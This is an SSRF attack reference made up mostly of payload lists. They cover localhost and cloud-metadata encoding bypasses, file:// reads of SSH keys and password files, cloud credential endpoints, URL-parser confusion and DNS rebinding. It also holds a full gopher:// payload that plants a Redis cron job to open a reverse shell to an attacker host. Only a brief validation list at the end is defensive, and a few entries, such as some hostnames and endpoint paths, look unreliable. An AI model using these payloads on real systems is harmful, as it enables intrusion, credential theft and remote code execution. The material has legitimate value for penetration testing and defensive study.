# Server-Side Request Forgery (SSRF): Complete Reference

## Attack Surface & Entry Points

### Common SSRF Parameters
```
url=, src=, source=, target=, dest=, destination=, redirect=,
callback=, webhook=, image=, img=, file=, load=, path=,
data=, domain=, host=, endpoint=, api=, link=, href=
```

### Vulnerable Features
- Link preview/image unfurl (chat apps, social media)
- Webhook endpoints / avatar URL import
- PDF generation from URL (wkhtmltopdf, puppeteer)
- RSS/Atom feed imports
- Document conversion (DOCX->PDF, URL->screenshot)
- SSO/SAML metadata URL loading
- Proxy functionality (API gateway, load balancer)
- AI/LLM inference endpoints that fetch context URLs

### CVSS v3.1 Scoring
| Scenario | CVSS | Criteria |
|----------|------|----------|
| Blind SSRF to internal port scan | 6.3 | Network, Low, No auth, No user interaction, Changed scope |
| SSRF read cloud metadata -> credential leak | 8.8 | Network, Low, No auth, Changed scope, High confidentiality |
| SSRF RCE via gopher to internal Redis | 9.0 | Network, Low, No auth, Changed scope, Full impact |
| SSRF to internal service SSRF chain | 9.6 | Network, Low, No auth, Changed scope, Full impact, Exploit exist |

## IP Address Bypass Techniques

### 127.0.0.1 / Localhost
```
http://127.0.0.1:8080/admin
http://127.1/
http://0.0.0.0:8080/admin
http://[::1]:8080/admin
http://0177.0.0.1/          (Octal)
http://2130706433/           (Decimal)
http://0x7f000001/           (Hex)
http://0x7f.0x0.0x0.0x1/    (Hex parts)
http://127.0.0.1.nip.io/    (DNS rebinding service)
http://127.0.0.1.xip.io/    (DNS rebinding service)
http://spoofed.burpcollaborator.net/  (Point to 127.0.0.1)
http://localtest.me/         (Resolves to 127.0.0.1)
http://lvh.me/               (Resolves to 127.0.0.1)
```

### 169.254.169.254 (Cloud Metadata)
```
http://169.254.169.254/latest/meta-data/
http://0251.0254.0251.0254/        (Octal)
http://2852039166/                   (Decimal)
http://0xA9FEA9FE/                  (Hex)
http://0xa9.0xfe.0xa9.0xfe/        (Hex parts)
http://[::ffff:a9fe:a9fe]/          (IPv6 mapped)
http://[0:0:0:0:0:ffff:a9fe:a9fe]/  (IPv6 expanded)
http://169.254.169.254.xip.io/      (DNS rebinding)
http://metadata.nicobnist.com/      (DNS rebinding service)
```

## Protocol Scheme Smuggling

### file:// - Local File Read
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/fd/0
file:///etc/nginx/nginx.conf
file:///etc/ssh/sshd_config
file:///root/.ssh/id_rsa
file:///var/log/apache2/access.log
file:///var/www/html/index.php
file:///etc/apache2/.htpasswd
```

### gopher:// - Arbitrary TCP Data
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
gopher://127.0.0.1:3306/_gopher-redis-payload
gopher://127.0.0.1:11211/_gopher-memcached-payload
gopher://127.0.0.1:25/_HELO attacker...
```

### dict:// - Port Probing
```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:3306/status
dict://127.0.0.1:27017/
dict://127.0.0.1:11211/stats
dict://127.0.0.1:6379/CONFIG GET dir
```

### Other Useful Schemes
```
ldap://127.0.0.1:389/%00
sftp://attacker.com/
tftp://attacker.com/file  --save
netdoc:///etc/passwd   (Java only)
jar:///tmp/evil.jar!/  (Java only)
php://filter/convert.base64-encode/resource=/etc/passwd  (PHP only)
php://expect://id  (PHP expect extension)
```

## Cloud Metadata Exploitation

### AWS
```bash
# IMDSv1 (no token required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/placement/availability-zone

# IMDSv2 (requires PUT token)
# Step 1: PUT to get token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: GET with token
GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: $TOKEN

# Lambda runtime API
http://169.254.169.254/2018-06-01/runtime/invocation/next
http://169.254.169.254/2018-06-01/runtime/init/error

# ECS container metadata
http://169.254.170.2/v2/credentials/
http://169.254.170.2/v2/metadata/
```

### GCP
```bash
# Standard (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/kube-env

# Legacy endpoints (may not require header)
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/0.1/meta-data/
http://metadata.google.internal/
```

### Azure
```bash
# Requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# WireServer (no header required on some versions)
http://168.63.129.16/?comp=goalstate
http://168.63.129.16/machine/?comp=goalstate
```

## Blind SSRF Detection

### Out-of-Band (Collaborator / Interact.sh)
```bash
# Basic blind detection
curl "http://target.com/fetch?url=http://COLLABORATOR.oastify.com"
curl "http://target.com/load?file=http://COLLABORATOR.oastify.com/test"
curl "http://target.com/proxy?url=http://COLLABORATOR.oastify.com/redirect"

# DNS-based detection (when HTTP is blocked)
# Use Burp Collaborator or interact.sh for DNS callback
http://COLLABORATOR.oastify.com/
http://RANDOM.oastify.com/

# Time-based detection (slow page load == internal host)
url=http://192.168.1.1/
url=http://10.0.0.1/
# Internal hosts often have slow timeouts (30s+)
# Compare timing: external host (1s) vs internal host (30s)
```

### SSRF Chain Detection
```
1. LFI -> SSRF
   /read?file=http://127.0.0.1:8080/admin
2. XXE -> SSRF
   <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
3. Redirect -> SSRF
   http://target.com/redirect?url=http://127.0.0.1/admin
```

## Redirect-Based SSRF
```bash
# Host a 302 redirect on attacker.com -> 169.254.169.254
# If target follows redirects, it bypasses URL validation
http://attacker.com/redirect

# Protocol downgrade via redirect (HTTPS->HTTP)
# Some HTTP clients strip security settings on protocol downgrade
# HTTPS fetch -> redirect to http://127.0.0.1:8080/

# Open redirect chaining
# Use existing open redirect on target as SSRF bypass
http://target.com/redirect?next=http://169.254.169.254/latest/meta-data/
```

## Framework-Specific SSRF

### Next.js (CVE-2024-34351, CVE-2025-57822)
```bash
# Host header manipulation triggers server-side fetch
Host: 169.254.169.254
# If the application does internal fetch based on Host header
# Next.js SSRF via image optimization endpoint
/_next/image?url=http://169.254.169.254/
```

### PHP (filter/expect wrappers)
```bash
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=../.env
expect://id
```

### Node.js / Python SSRF fetch
```bash
# Electron/Node.js fetch bypass
file:///etc/passwd
file:///C:/Windows/win.ini

# Python requests/urllib
# Follows redirects by default
# Supports file://, gopher://, dict:// schemes
```

## Defense Bypass Patterns

### URL Parser Confusion (Orange Tsai class)
```
http://expected.com@169.254.169.254/
http://169.254.169.254#@expected.com/
http://expected.com:80@169.254.169.254:80/
http://expected.com%2f@169.254.169.254/
http://169.254.169.254%2f%2fexpected.com/
http://expected.com%5c@169.254.169.254/
http://169.254.169.254#expected.com
http://169.254.169.254?expected.com
http://expected.com:169.254.169.254/
```

### DNS Rebinding
```bash
# Register a domain with TTL of 0
# Alternates between public IP and internal IP (169.254.169.254)
# Attack:
# 1. Victim's DNS query resolves to attacker's public IP (passes validation)
# 2. Application performs fetch
# 3. DNS re-resolves to internal IP (cloud metadata)
# 4. SSRF succeeds because validation already passed

# Tools:
# singular.ui (https://github.com/niccokunzmann/singular.ui)
# rbndr.us (https://lock.cmpxchg8b.com/rebinder.html)
# 1u.ms (DNS rebinding service)

# Manual approach:
# Host on IP 1.2.3.4 with TTL=1
# After validation, switch to 169.254.169.254
```

## Validation Strategy
1. Resolve domain to IP
2. Check IP against blocklist (RFC1918, loopback, link-local)
3. Pin the resolved IP (don't re-resolve)
4. After redirect, re-validate the new URL
5. Disable redirect following when possible
6. Use allowlist of approved URLs instead of blocklist
7. Restrict schemes to http/https only